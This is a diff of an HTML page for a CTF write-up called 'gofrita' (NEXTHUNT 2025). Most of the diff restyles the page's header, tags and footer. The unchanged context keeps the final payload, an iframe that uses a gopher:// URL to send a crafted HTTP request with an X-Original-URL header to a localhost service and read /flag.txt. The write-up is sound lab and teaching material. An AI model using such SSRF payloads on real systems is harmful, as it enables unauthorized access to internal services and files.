@@ -3,16 +3,21 @@
 <meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
 <title>gofrita - 0xsila</title>
 <meta name="description" content="Iframe injection to SSRF over gopher, then an X-Original-URL bypass.">
-<meta name="color-scheme" content="light dark">
+<meta name="color-scheme" content="dark light">
 <link rel="icon" href="../assets/img/favicon.svg" type="image/svg+xml">
 <link rel="stylesheet" href="../assets/css/style.css">
 </head><body><div class="wrap">
-<header class="top"><a href="../index.html"><b>0xsila</b></a>
-<nav><a href="../index.html#writeups">writeups</a><a href="../index.html#reports">reports</a><a href="../index.html#certifications">certifications</a><a href="../index.html#contact">contact</a></nav></header>
-<p><a href="../index.html#writeups">&larr; writeups</a></p>
+<header class="top">
+<a class="brand" href="../index.html"><span class="mono-mark">0x</span>sila</a>
+<nav><a href="../index.html#writeups">writeups</a><a href="../index.html#reports">reports</a><a href="../index.html#certifications">certifications</a><a href="../index.html#contact">contact</a></nav>
+</header>
+<article class="post">
+<p><a class="back" href="../index.html#writeups">&larr; writeups</a></p>
+<p class="kicker">CTF writeup &middot; NEXTHUNT 2025 &middot; 3 min read</p>
 <h1>gofrita</h1>
-<p class="meta">CTF challenge writeup &middot; NEXTHUNT 2025 &middot; author: 0xsila</p>
-<article class="prose"><p><strong>Author</strong> : 0xsila </p>
+<p class="lede">Iframe injection to SSRF over gopher, then an X-Original-URL bypass.</p>
+<p class="tags"><span class="tag">ssrf</span><span class="tag">gopher</span><span class="tag">impact-escalation</span></p>
+<div class="prose"><p><strong>Author</strong> : 0xsila </p>
 <h2>Challenge Name</h2>
 <p><strong>gofrita</strong></p>
 <h2>Challenge Description :</h2>
@@ -64,8 +69,9 @@ the final payload:
 &lt;iframe src=&quot;gopher://127.0.0.1:3333/_GET%20/blablabla%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0aX-Original-URL:%20/flag.txt%0d%0a%0d%0a&quot;&gt;&lt;/iframe&gt;
 </code></pre>
 <p>and get the flag : </p>
-<p><img alt="alt text" src="../assets/writeups/gofrita/image-3.png" /></p></article>
+<p><img alt="alt text" src="../assets/writeups/gofrita/image-3.png" /></p></div>
 
-<p><a href="https://github.com/0xsila/nexus-nexthunt-ctf-2025-challenges/tree/main/gofrita">Challenge source on GitHub</a></p>
-<div class="pn"><a href="dz-kitab.html">previous: Dz-Kitab</a><a href="web-daveloper.html">next: web daveloper</a></div>
-<div class="foot">Sila Yahia &middot; 0xsila &middot; <a href="mailto:silayahia7@gmail.com">silayahia7@gmail.com</a></div></div></body></html>
+<p><a href="https://github.com/0xsila/nexus-nexthunt-ctf-2025-challenges/tree/main/gofrita">Challenge source on GitHub &rarr;</a></p>
+</article>
+<div class="pn"><a class="pn-link" href="dz-kitab.html"><span class="mute">previous</span><br>Dz-Kitab</a><a class="pn-link" href="web-daveloper.html"><span class="mute">next</span><br>web daveloper</a></div>
+<footer class="foot"><span>Sila Yahia &middot; 0xsila</span><span><a href="mailto:silayahia7@gmail.com">silayahia7@gmail.com</a></span></footer></div></body></html>
